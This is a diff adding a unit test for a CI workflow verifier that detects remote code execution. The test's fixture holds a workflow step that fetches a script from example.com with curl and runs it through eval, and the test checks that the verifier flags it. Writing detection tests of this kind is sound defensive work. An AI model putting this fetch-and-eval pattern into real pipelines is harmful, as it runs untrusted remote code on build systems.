@@ -63,3 +63,24 @@ test("Unit workflow remote-exec verifier: matching allowlist suppresses violatio
   assert.equal(result.status, 0, `${result.stderr || ""}\n${result.stdout || ""}`);
   assert.match(result.stdout || "", /Verified workflow remote-exec policy/i);
 });
+
+test("Unit workflow remote-exec verifier: shell indirection with network signal is blocked", async () => {
+  const workflowContent = [
+    "name: Obfuscated Remote Exec",
+    "on: [push]",
+    "jobs:",
+    "  verify:",
+    "    runs-on: ubuntu-latest",
+    "    steps:",
+    "      - name: obfuscated exec",
+    "        id: obfuscated-exec",
+    "        run: |",
+    "          FETCH_URL=\"https://example.com/install.sh\"",
+    "          PAYLOAD=\"$(curl -fsSL \\\"$FETCH_URL\\\")\"",
+    "          eval \"$PAYLOAD\"",
+  ].join("\n");
+  const result = await runRemoteExecVerifier({ workflowContent });
+  assert.notEqual(result.status, 0);
+  const combinedOutput = `${result.stdout || ""}\n${result.stderr || ""}`;
+  assert.match(combinedOutput, /Potential remote shell execution/i);
+});
